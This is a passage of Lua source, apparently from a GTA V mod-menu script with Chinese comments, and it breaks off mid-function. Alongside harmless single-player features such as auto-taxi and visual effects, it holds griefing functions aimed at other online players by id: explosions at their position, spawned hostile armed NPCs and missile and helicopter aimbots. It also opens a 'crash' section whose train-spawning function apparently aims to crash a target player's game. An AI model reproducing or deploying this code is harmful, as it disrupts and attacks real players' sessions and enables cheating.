        local dJetRealLoc = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(JetD, 0, 0, 0)

        local aDistance = Get_distance(aJetRealLoc, aJetAimpos, true)
        local bDistance = Get_distance(bJetRealLoc, bJetAimpos, true)
        local cDistance = Get_distance(cJetRealLoc, cJetAimpos, true)
        local dDistance = Get_distance(dJetRealLoc, dJetAimpos, true)
        if aDistance < 40 then
            aJetSpeed = -0.8
        else
            aJetSpeed = 0.5
        end
        if bDistance < 40 then
            bJetSpeed = -0.8
        else
            bJetSpeed = 0.5
        end
        if cDistance < 40 then
            cJetSpeed = -0.8
        else
            cJetSpeed = 0.5
        end
        if dDistance < 40 then
            dJetSpeed = -0.8
        else
            dJetSpeed = 0.5
        end

        if not PED.IS_PED_ON_FOOT(PLAYER.PLAYER_PED_ID()) then
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(JetA, 1, 0, aJetSpeed, 0, true, true, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(aTarget, aJetAimpos.x, aJetAimpos.y, aJetAimpos.z, false, false, false)

            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(JetB, 1, 0, bJetSpeed, 0, true, true, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(bTarget, bJetAimpos.x, bJetAimpos.y, bJetAimpos.z, false, false, false)

            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(JetC, 1, 0, cJetSpeed, 0, true, true, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(cTarget, cJetAimpos.x, cJetAimpos.y, cJetAimpos.z, false, false, false)

            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(JetD, 1, 0, dJetSpeed, 0, true, true, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dTarget, dJetAimpos.x, dJetAimpos.y, dJetAimpos.z, false, false, false)
        end

        util.yield()
    end
end



----自动出租车
local taxi_way = 1
function check_taxi_way(index)
    taxi_way = index
    util.toast("切换成功，下一轮生效")
end
function auto_taxi(toggled)
    auto_taxi_toggled = toggled
    while auto_taxi_toggled do
        local play_car = PED.GET_VEHICLE_PED_IS_USING(PLAYER.PLAYER_PED_ID())
        local vhash = ENTITY.GET_ENTITY_MODEL(play_car)
        if play_car == 0 or util.reverse_joaat(vhash) ~= 'taxi' then
            ENTITY.SET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), 895.1739, -179.2708, 74.70049, false, true, true, false)
            util.yield(2500)
            PAD.SET_CONTROL_VALUE_NEXT_FRAME(0, 51, 1)
            util.yield(10000)
        end

        if HUD.DOES_BLIP_EXIST(HUD.GET_CLOSEST_BLIP_INFO_ID(280)) then
            local taxi_blip = HUD.GET_CLOSEST_BLIP_INFO_ID(280) --乘客
            local taxi_ent = HUD.GET_BLIP_INFO_ID_ENTITY_INDEX(taxi_blip)
            local taxi = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(taxi_ent, 0, 6, 0)
            util.yield(500)

            --前往乘客位置
            if taxi_way == 1 then
                auto_driving_to_coord(PLAYER.PLAYER_PED_ID(), taxi.x, taxi.y, taxi.z, 60.0, 2883621, 0.0)
                while true do
                    local pos = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(280))
                    local veh = PED.GET_VEHICLE_PED_IS_USING(PLAYER.PLAYER_PED_ID())
                    local vpos = ENTITY.GET_ENTITY_COORDS(veh, false)
                    local dis = Get_distance(vpos, pos, true)
                    draw_string(dis, 0.03, 0.15, 0.6, 4)
                    if dis < 6 then
                        ENTITY.FREEZE_ENTITY_POSITION(veh, true)
                        break
                    end
                    util.yield()
                end
                util.toast("到达目的地")
            else
                PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), PED.GET_VEHICLE_PED_IS_USING(PLAYER.PLAYER_PED_ID()), -1)
                PED.SET_PED_COORDS_KEEP_VEHICLE(PLAYER.PLAYER_PED_ID(), taxi.x, taxi.y, taxi.z, false, false, false, false)
            end
            util.yield(1500)

            --按下互动键
            PAD.SET_CONTROL_VALUE_NEXT_FRAME(0, 86, 1)
            while HUD.DOES_BLIP_EXIST(HUD.GET_CLOSEST_BLIP_INFO_ID(280)) do
                util.yield()
            end
            local veh = PED.GET_VEHICLE_PED_IS_USING(PLAYER.PLAYER_PED_ID())
            ENTITY.FREEZE_ENTITY_POSITION(veh, false)
            util.yield(500)

            --前往乘客目的地位置
            if HUD.DOES_BLIP_EXIST(HUD.GET_CLOSEST_BLIP_INFO_ID(1)) then
                local waypoint = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(1))
                local vehicle = PED.GET_VEHICLE_PED_IS_USING(PLAYER.PLAYER_PED_ID())

                if taxi_way == 1 then
                    auto_driving_to_coord(PLAYER.PLAYER_PED_ID(), waypoint.x, waypoint.y, waypoint.z, 60.0, 2883621, 0.0)
                    while HUD.DOES_BLIP_EXIST(HUD.GET_CLOSEST_BLIP_INFO_ID(1)) do
                        util.yield()
                    end
                else
                    PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), PED.GET_VEHICLE_PED_IS_USING(PLAYER.PLAYER_PED_ID()), -1)
                    menu.trigger_commands('tpobjective')
                end
            end

        end
        util.yield()
    end
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
    util.toast('已结束出租车工作')
end


----消防栓大喷水
function firefighting(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local objects = {}
    for i = 1, 11 do
        local coords = players.get_position(pid)
        objects[#objects + 1] = entities.create_object(200846641, v3.new(coords.x + math.random(-5, 5), coords.y + math.random(-5, 5), coords.z))
        util.yield()
    end
    util.yield(500)
    for i, obj in ipairs(objects) do
        local objcoords = ENTITY.GET_ENTITY_COORDS(obj)
        FIRE.ADD_EXPLOSION(objcoords.x, objcoords.y, objcoords.z, 64, 100, true, true, 0.5, true)
    end
    util.yield(13000)
    for i = 1, #objects do
        delete_entity(objects[i])
    end
end


--intToIp
function intToIp(num)
    ip = ""
    local int16 = string.format("%x", num)
    for i = 1, #int16 do
      if 0 == math.fmod(i, 2) then
        if ip ~= "" then
          ip = ip .. "." .. var_int
        else
          ip = var_int
        end
      else
        var_int = tostring(tonumber(string.sub(int16, i, i + 1), 16))
      end
    end
    return ip
end

----涂鸦枪
local graffiti_radius = 5--半径
local graffiti_brightness = 100--亮度
local graffiti_colors = {r = 0, g = 0, b = 1, a = 0}--颜色
function graffiti_bright(value)
    graffiti_brightness = value
end
function graffiti_radiu(value)
    graffiti_radius = value
end
function graffiti_color(value)
    graffiti_colors = value 
end
function Graffiti_weapon(toggled)
    Graffiti = toggled
    local light_num = {}
    while Graffiti do
        local pos = v3.new()
        if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(PLAYER.PLAYER_PED_ID(), pos) and not PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID()) then
            light_num[#light_num + 1] = pos
        end
        for i = 1, #light_num do
            GRAPHICS.DRAW_LIGHT_WITH_RANGE(light_num[i].x, light_num[i].y, light_num[i].z, graffiti_colors.r * 255, graffiti_colors.g * 255, graffiti_colors.b * 255, graffiti_radius / 10, graffiti_brightness)
        end
        util.yield()
    end
end

----鲨鱼枪
function Shark_gun()
    local pos = v3.new()
	if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(PLAYER.PLAYER_PED_ID(), pos) then
        local hash = 0x06C3F072
        local NPC = create_ped(26, hash, pos.x, pos.y, pos.z, 0)
        ENTITY.FREEZE_ENTITY_POSITION(NPC, true)
        ENTITY.SET_ENTITY_ROTATION(NPC, 90, 0, 0, 1, true)
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 4, 100, true, false, 1, false)
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 13, 1, true, false, 0, false)
    end
end
--鲨鱼吃掉玩家
function Shark_eating(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    local hash = 0x06C3F072
    local NPC = create_ped(26, hash, pos.x, pos.y, pos.z, 0)
    ENTITY.FREEZE_ENTITY_POSITION(NPC, true)
    ENTITY.SET_ENTITY_ROTATION(NPC, 90, 0, 0, 1, true)
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 4, 100, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 13, 1, true, false, 0, false)
end

----直升机自动瞄准器
function helicopter_automatic_sight()
    if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), true) then
        local veh = PED.GET_VEHICLE_PED_IS_USING(PLAYER.PLAYER_PED_ID())
        if VEHICLE.GET_VEHICLE_CLASS(veh) == 15 or VEHICLE.GET_VEHICLE_CLASS(veh) == 16 then 
            local ped = get_closest_player(PLAYER.PLAYER_PED_ID(), 200)
            local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(ped)
            if PED.IS_PED_A_PLAYER(ped) and not players.is_in_interior(pid) and not PED.IS_PED_DEAD_OR_DYING(ped, true) then
                draw_string("当前瞄准玩家: " .. PLAYER.GET_PLAYER_NAME(pid), 0.03, 0.1, 0.4, 1)
                if PAD.IS_CONTROL_PRESSED(0,22) or PAD.IS_CONTROL_PRESSED(0,25) then
                    local pcoords = PED.GET_PED_BONE_COORDS(ped, 24817, 0, 0, 0)
                    local mycoords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())  
                    local look = v3.lookAt(mycoords, pcoords)
                    ENTITY.SET_ENTITY_ROTATION(veh, look.x, look.y, look.z, 1, true)
                end
            end
        end
    end
end

----载具导弹自瞄
function veh_missile_aimbit()
    if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), true) then
        local ped = get_closest_player(PLAYER.PLAYER_PED_ID(), 200)
        local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(ped)

        local mycoords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),false)
        local pcoords = ENTITY.GET_ENTITY_COORDS(ped,false)
        local dist = Get_distance(mycoords, pcoords, true)

        if PED.IS_PED_A_PLAYER(ped) and not players.is_in_interior(pid) and not PED.IS_PED_DEAD_OR_DYING(ped, true) and dist < 200.0 then
            draw_string("当前瞄准玩家: " .. PLAYER.GET_PLAYER_NAME(pid), 0.03, 0.1, 0.5, 1)
            if PED.IS_PED_IN_ANY_PLANE(PLAYER.PLAYER_PED_ID()) then
                --在飞机内可使用空格和鼠标右键发射导弹
                if not PED.IS_PED_DEAD_OR_DYING(ped) and (PAD.IS_CONTROL_PRESSED(0, 70) or PAD.IS_CONTROL_PRESSED(0, 22)) then
                    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), false)
                    VEHICLE1.SET_VEHICLE_SHOOT_AT_TARGET(PLAYER.PLAYER_PED_ID(), ped, pos.x, pos.y, pos.z)
                end
            else
                if not PED.IS_PED_DEAD_OR_DYING(ped) and PAD.IS_CONTROL_PRESSED(0, 25) then
                    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), false)
                    VEHICLE1.SET_VEHICLE_SHOOT_AT_TARGET(PLAYER.PLAYER_PED_ID(), ped, pos.x, pos.y, pos.z)
                end
            end
        end

    end

end


----NPC杀
function NPC_kill(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local hash = util.joaat("mp_m_weapexp_01")
    request_model(hash)
    for i = 1, 10 do
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        pos.x = pos.x + math.random(-20, 20 + i)--获取随机数
        pos.y = pos.y + math.random(-20, 20)
        
        local Peds = PED.CREATE_PED(4, hash, pos.x, pos.y, pos.z, 1.0, true, false)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(Peds, 0x476BF155, 0, true)
        ENTITY.SET_ENTITY_HEALTH(Peds, 410, 0)
        PED.SET_PED_COMBAT_ABILITY(Peds, 2)
        PED.SET_PED_COMBAT_ATTRIBUTES(Peds, 5, true)
        TASK.TASK_COMBAT_PED(Peds, PLAYER.GET_PLAYER_PED(pid), 1, 16)
        PED.SET_PED_RELATIONSHIP_GROUP_HASH(Peds, 0x84DCFAAD)
        local posped = ENTITY.GET_ENTITY_COORDS(Peds)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(posped.x, posped.y, posped.z, posped.x, posped.y, posped.z + 0.1, 0, 0, 453432689, 0, false, true, 100)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)   
    end
end

--缩小NPC
function shrink_peds(on)
    if on then	
        local peds = entities.get_all_peds_as_handles()
        for i = 1, #peds do
            if not PED.IS_PED_A_PLAYER(peds[i]) then
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(peds[i])
                PED.SET_PED_CONFIG_FLAG(peds[i], 223, true)
            end
        end
    else
        local peds = entities.get_all_peds_as_handles()
        for i = 1, #peds do
            if not PED.IS_PED_A_PLAYER(peds[i]) then
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(peds[i])
                PED.SET_PED_CONFIG_FLAG(peds[i], 223, false)
            end
        end
    end
end

----移除尸体
function Remove_dead_body()
    for _, ped in ipairs(entities.get_all_peds_as_handles()) do
        if ENTITY.IS_ENTITY_DEAD(ped, true) then
            request_control(ped)
            delete_entity(ped)
        end
    end
end
----移除丧尸
function Remove_zombies()
    for _, ped in ipairs(entities.get_all_peds_as_handles()) do
        if ENTITY.GET_ENTITY_MODEL(ped) == -1404353274 then
            request_control(ped)
            delete_entity(ped)
        end
    end
end
----给予NPC所有武器
function give_AllNPC_weapon()
    for _, ped in ipairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ped) then
            give_all_weapon(ped)
        end
    end
end
----移除NPC所有武器
function remove_AllNPC_waepon()
    for _, ped in ipairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ped) then
            remove_all_weapon(ped)
        end
    end
end
----NPC无视玩家
function NPC_Ignore_player()
    PLAYER.SET_POLICE_IGNORE_PLAYER(PLAYER.PLAYER_ID(), true)
    PLAYER.SET_EVERYONE_IGNORE_PLAYER(PLAYER.PLAYER_ID(), true)
    PLAYER.SET_PLAYER_CAN_BE_HASSLED_BY_GANGS(PLAYER.PLAYER_ID(), false)
    PLAYER.SET_IGNORE_LOW_PRIORITY_SHOCKING_EVENTS(PLAYER.PLAYER_ID(), true)
end
--冷静NPC
function calm_all_npc()
    for _, ped in ipairs(entities.get_all_peds_as_handles()) do
        calm_ped(ped, true)
    end
end

----敌意NPC
function enmity_npc()
    for i, ped in pairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ped) and ENTITY.DOES_ENTITY_EXIST(ped) then
            TASK.TASK_COMBAT_PED(ped, PLAYER.PLAYER_PED_ID(), 0, 16)
        end
    end
end



----伪装
local disguise_object = 1
function player_disguise_select(index)
    disguise_object = index
end
local camouobject = 0
function player_disguise(state)
    disguise_state = state 
    while disguise_state do
        ENTITY.SET_ENTITY_ALPHA(PLAYER.PLAYER_PED_ID(), 0, false)
        if disguise_objectt ~= disguise_object and ENTITY.DOES_ENTITY_EXIST(camouobject) then
            delete_entity(camouobject)
        end
        disguise_objectt = disguise_object
        local object_hash = MISC.GET_HASH_KEY(disguise_objects[disguise_objectt])
        local player_pos = players.get_position(PLAYER.PLAYER_ID())
        if camouobject == nil or not ENTITY.DOES_ENTITY_EXIST(camouobject) then
            camouobject = entities.create_object(object_hash, player_pos)
        end
        ENTITY.SET_ENTITY_COLLISION(camouobject, false, false)
        player_rot = ENTITY.GET_ENTITY_ROTATION(PLAYER.PLAYER_PED_ID(), 5)
        ENTITY.SET_ENTITY_COORDS(camouobject, player_pos.x, player_pos.y, player_pos.z - 1, false, false, false, false)
        ENTITY.SET_ENTITY_ROTATION(camouobject, 0, 0, player_rot.z, 1, true)
        util.yield()
    end
    delete_entity(camouobject)
    ENTITY.SET_ENTITY_ALPHA(PLAYER.PLAYER_PED_ID(), 255, false)
end




----列车选项
function get_closest_train()
    local vehicles = entities.get_all_vehicles_as_handles()
    for k, veh in pairs(vehicles) do
        if ENTITY.GET_ENTITY_MODEL(veh) == 1030400667 then
            request_control(veh)
            return veh
        end
    end
    util.toast("找不到附近的火车")
    return 0
end
function spawn_train(variation, pos)
    local trainmodels = {util.joaat("metrotrain"), util.joaat("freight"), util.joaat("freightcar"), util.joaat("freightcont1"), util.joaat("freightcont2"), util.joaat("freightgrain"), util.joaat("tankercar")}
    for _, model in ipairs(trainmodels) do
        request_model(model)
    end
    local train = VEHICLE.CREATE_MISSION_TRAIN(variation, pos.x, pos.y, pos.z, 0)
    local posTrain = ENTITY.GET_ENTITY_COORDS(train)
    local netid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(veh)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netid)
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netid, false)
    teleport(posTrain.x, posTrain.y, posTrain.z, false)
    util.toast(string.format("火车生成于 (%.1f, %.1f, %.1f)", posTrain.x, posTrain.y, posTrain.z))
end






----阻止玩家观看
function block_spectate()
    for _, pid in players.list(false, true, true) do
        local ped_dist = v3.distance(players.get_position(PLAYER.PLAYER_ID()), players.get_position(pid))
        if v3.distance(players.get_position(PLAYER.PLAYER_ID()), players.get_cam_pos(pid)) < 25.0 and ped_dist > 30.0 or players.get_spectate_target(pid) == PLAYER.PLAYER_ID() then
            menu.trigger_commands("timeout " .. players.get_name(pid) .. " on")
            local pos = players.get_position(PLAYER.PLAYER_ID())
            if v3.distance(pos, players.get_cam_pos(pid)) < 25.0 then
                repeat 
                    util.yield()
                until v3.distance(pos, players.get_cam_pos(pid)) > 50.0 
                menu.trigger_commands("timeout " .. players.get_name(pid) .. " off")
            end
        end
    end
end


----冻结选项
local frozen_vehicles = {}
function update_frozen_vehicles()
    for _, frozen_vehicle in pairs(frozen_vehicles) do
        if ENTITY.DOES_ENTITY_EXIST(frozen_vehicle.vehicle) then
            ENTITY.FREEZE_ENTITY_POSITION(frozen_vehicle.vehicle, true)
        end
    end
end
function refresh_frozen_vehicles_menu_list()
    menu.delete(frozen_vehicles_menu_list)
    frozen_vehicles_menu_list = menu.list(vf, "已冻结的载具")
    for index, frozen_vehicle in pairs(frozen_vehicles) do
        menu.action(frozen_vehicles_menu_list, frozen_vehicle.name, {"unfreeze"..index}, "点击解冻载具", function()
            table.remove(frozen_vehicles, index)
            ENTITY.FREEZE_ENTITY_POSITION(frozen_vehicle.vehicle, false)
            refresh_frozen_vehicles_menu_list()
        end)
    end
end
function add_frozen_vehicle(vehicle)
    for index, frozen_vehicle in pairs(frozen_vehicles) do
        if frozen_vehicle.vehicle == vehicle then
            return
        end
    end
    local model = ENTITY.GET_ENTITY_MODEL(vehicle)
    local name = VEHICLE.GET_DISPLAY_NAME_FROM_VEHICLE_MODEL(model)
    table.insert(frozen_vehicles, {name=name,vehicle=vehicle})
    refresh_frozen_vehicles_menu_list()
    update_frozen_vehicles()
end




--加载配置和保存配置
local luaConfig_path = filesystem.stand_dir() .. 'SakuraConfig.json'
if filesystem.exists(luaConfig_path) then
    luaConfig = get_info_from_jsonfile(luaConfig_path)
else
    luaConfig = {}
end
function save_config()
    local active = {}
    for k, v in pairs(LuaConfigName) do
        active[v] = menu.get_value(_G[v])
    end
    local config_txt = TableToJson(active)
    --TableToJson(active)
    local file = io.open(luaConfig_path, 'w')
    file:write(config_txt)
    file:close()
    notification("~y~~bold~配置已保存", HudColour.blue)
end
function set_menu_value(menu_name, value, defaut)
    if value ~= nil then
        menu.set_value(menu_name, value)
    else
        menu.set_value(menu_name, defaut)
    end
end


----循环清理实体
function loop_clear_entity()
    for i, entity in pairs(entities.get_all_vehicles_as_handles()) do
        request_control(entity)
        delete_entity(entity) 
    end
    for i, entity in pairs(entities.get_all_peds_as_handles()) do
        request_control(entity)
        delete_entity(entity) 
    end
    for i, entity in pairs(entities.get_all_objects_as_handles()) do
        request_control(entity)
        delete_entity(entity) 
    end
end


----世界重力
function request_control_of_table_once(tbl)
    for index, entity in ipairs(tbl) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
    end
end
function World_gravity(option_index)
    gravity_current_index = option_index
    if option_index ~= 1 then
        while gravity_current_index == option_index do
            request_control_of_table_once(entities.get_all_vehicles_as_handles())
            request_control_of_table_once(entities.get_all_objects_as_handles())
            request_control_of_table_once(entities.get_all_peds_as_handles())
            request_control_of_table_once(entities.get_all_pickups_as_handles())
            MISC.SET_GRAVITY_LEVEL(option_index - 1)
            util.yield()
        end
    else
        MISC.SET_GRAVITY_LEVEL(option_index - 1)
    end
end

----万象天征
function vientiane_explosion()
    if PAD.IS_DISABLED_CONTROL_JUST_PRESSED(0, 46) then
        local range = 5
        util.create_tick_handler(function()
            if range < 40 then
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
                GRAPHICS.DRAW_MARKER_SPHERE(pos.x, pos.y, pos.z, range, 223, 255, 245, 0.5)
            else
                return false
            end
        end)

        while range <= 40 do
            range = range + 0.5

            local player_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
            for _, vehicle in pairs(entities.get_all_vehicles_as_handles()) do
                local vpos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
                if v3.distance(player_pos, vpos) <= range and ENTITY.GET_ENTITY_HEALTH(vehicle) > 0 then
                    FIRE.ADD_EXPLOSION(vpos.x, vpos.y, vpos.z, 0, 100, true, false, 1, false)
                end
            end
            for _, ped in pairs(entities.get_all_peds_as_handles()) do
                local ppos = ENTITY.GET_ENTITY_COORDS(ped, false)
                if (v3.distance(player_pos, ppos) <= range) and not PED.IS_PED_A_PLAYER(ped) and ENTITY.GET_ENTITY_HEALTH(ped) > 0 then
                    FIRE.ADD_EXPLOSION(ppos.x, ppos.y, ppos.z, 0, 100, true, false, 1, false)
                end
            end

            util.yield()
        end
    end
end

----自动翻转
function vehicle_automatically()
    local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
    local rotation = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local heading = v3.getHeading(v3.new(rotation))
    local vehicle_distance_to_ground = ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(player_vehicle)
    local am_i_on_ground = vehicle_distance_to_ground < 2 --and true or false
    local speed = ENTITY.GET_ENTITY_SPEED(player_vehicle)
    if not VEHICLE.IS_VEHICLE_ON_ALL_WHEELS(player_vehicle) and ENTITY.IS_ENTITY_UPSIDEDOWN(player_vehicle) and am_i_on_ground then
        VEHICLE.SET_VEHICLE_ON_GROUND_PROPERLY(player_vehicle, 5.0)
        ENTITY.SET_ENTITY_HEADING(player_vehicle, heading)
        util.yield()
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(player_vehicle, speed)
    end
end



----保护球
local balltbl = {}
function Protect_ball(on)
    if on then
        local bigasscircle = util.joaat("ar_prop_ar_neon_gate4x_04a")
        local roration = 10
        request_model(bigasscircle)

        for i = 1, 19 do
            balltbl[i] = create_object(bigasscircle, -75.14637, -818.67236, 326.1751)
            ENTITY.FREEZE_ENTITY_POSITION(balltbl[i], true)
            ENTITY.SET_ENTITY_ROTATION(balltbl[i], 0.0, 0.0, roration, 1, true)
            roration = roration +  10
        end
        ENTITY.SET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), -75.14637, -818.67236, 326.1751)
    else
        for _, obj in pairs(balltbl) do
            delete_entity(obj)
        end   
    end
end



--射击效果
ShootEffect ={scale = 0,rotation = nil}
ShootEffect.__index = ShootEffect
setmetatable(ShootEffect, Effect)
function ShootEffect_new(asset, name, scale, rotation)
	tbl = setmetatable({}, ShootEffect)
	tbl.name = name
	tbl.asset = asset
	tbl.scale = scale or 1.0
	tbl.rotation = rotation or v3.new()
	return tbl
end
shootingEffects = {
	ShootEffect_new("scr_rcbarry2", "muz_clown", 0.8, v3.new(90, 0.0, 0.0)),
	ShootEffect_new("scr_rcbarry2", "scr_clown_bul", 0.3, v3.new(180.0, 0.0, 0.0))
}
local selectedshootOpt = 1
function Shoot_effect_option(index)
    selectedshootOpt = index
end
function Shoot_effect()
    local effect = shootingEffects[selectedshootOpt]
	if not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(effect.asset) then
		GRAPHICS1.REQUEST_NAMED_PTFX_ASSET(effect.asset)

	elseif PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
		local weapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(PLAYER.PLAYER_PED_ID(), 0)
		local boneId = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(weapon, "gun_muzzle")
		GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
		GRAPHICS.START_PARTICLE_FX_NON_LOOPED_ON_ENTITY_BONE(
			effect.name,
			weapon,
			0.0, 0.0, 0.0,
			effect.rotation.x, effect.rotation.y, effect.rotation.z,
			boneId,
			effect.scale,
			false, false, false
		)
	end
end



--命中效果
local HitEffect = {colorCanChange = false}
HitEffect.__index = HitEffect
setmetatable(HitEffect, Effect)
function HitEffect.new(asset, name, colorCanChange)
	local inst = setmetatable({}, HitEffect)
	inst.name = name
	inst.asset = asset
	inst.colorCanChange = colorCanChange or false
	return inst
end
hitEffects = {
	HitEffect.new("scr_rcbarry2", "scr_exp_clown"),
	HitEffect.new("scr_rcbarry2", "scr_clown_appears"),
	HitEffect.new("scr_rcpaparazzo1", "scr_mich4_firework_trailburst_spawn", true),
	HitEffect.new("scr_indep_fireworks", "scr_indep_firework_starburst", true),
	HitEffect.new("scr_indep_fireworks", "scr_indep_firework_fountain", true),
	HitEffect.new("scr_rcbarry1", "scr_alien_disintegrate"),
	HitEffect.new("scr_rcbarry2", "scr_clown_bul"),
	HitEffect.new("proj_indep_firework", "scr_indep_firework_grd_burst"),
	HitEffect.new("scr_rcbarry2", "muz_clown"),
}
local selectedhitOpt = 1
function set_effectColour(colour)
    hiteffectColour = colour
end
function hit_effect_option(opt)
    selectedhitOpt = opt
end
function Hit_effect()
    local effect = hitEffects[selectedhitOpt]
    if not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(effect.asset) then
        return STREAMING.REQUEST_NAMED_PTFX_ASSET(effect.asset)
    end
    local hitCoords = v3.new()
    if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(PLAYER.PLAYER_PED_ID(), hitCoords) then
        local raycastResult = get_raycast_result(1000.0)
        local rot = raycastResult.surfaceNormal:toRot()
        GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
        if effect.colorCanChange then
            GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(hiteffectColour.r, hiteffectColour.g, hiteffectColour.b)
        end
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            effect.name,
            hitCoords.x, hitCoords.y, hitCoords.z,
            rot.x - 90.0, rot.y, rot.z,
            1.0, 
            false, false, false, false
        )
    end
end




------防笼子
function Cage_proof()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
    for _, hash in ipairs(cageModels) do
        local obj = OBJECT.GET_CLOSEST_OBJECT_OF_TYPE(pos.x, pos.y, pos.z, 8.0, hash, false, false, false)
        if obj ~= 0 and ENTITY.DOES_ENTITY_EXIST(obj) then
            request_control(obj)
            delete_entity(obj)
        end
    end
end



--------崩溃部分
----新火车崩溃
function new_train_crash(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local ped = PLAYER.GET_PLAYER_PED(pid)
    if ENTITY.DOES_ENTITY_EXIST(ped) then
        for i = 0, 7 do
            local pos = ENTITY.GET_ENTITY_COORDS(ped, true)	
            pos.y = pos.y - 50
            local veh1 = create_vehicle(3564062519, pos.x, pos.y, pos.z, 0)	
            local obj1 = create_object(1890640474, pos.x, pos.y, pos.z)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(veh1, true, true)		
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(obj1, true, true)		
            ENTITY.SET_ENTITY_VISIBLE(veh1, true, 0)		
            ENTITY.SET_ENTITY_VISIBLE(obj1, true, 0)		
            ENTITY.SET_ENTITY_VELOCITY(veh1, 5, 3, 3)	
            ENTITY.SET_ENTITY_VELOCITY(obj1, 3, 4, 5)
            ENTITY.SET_ENTITY_ROTATION(obj1, math.random(360), math.random(360), math.random(360), 0, true)
            for i = 0, 8 do			
                ENTITY.ATTACH_ENTITY_TO_ENTITY(veh1, obj1, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true, false, false)	
                local veh2 = create_vehicle(868868440, pos.x, pos.y, pos.z, 0)
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(veh2, true, true)		
                local objpos = ENTITY.GET_ENTITY_COORDS(obj1, true)	
                FIRE.ADD_EXPLOSION(objpos.x, objpos.y, objpos.z, 0, 1.0, false, true, 0.0, false)		
                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh2, 1, 0, -100, 0, true, false, true, false);		
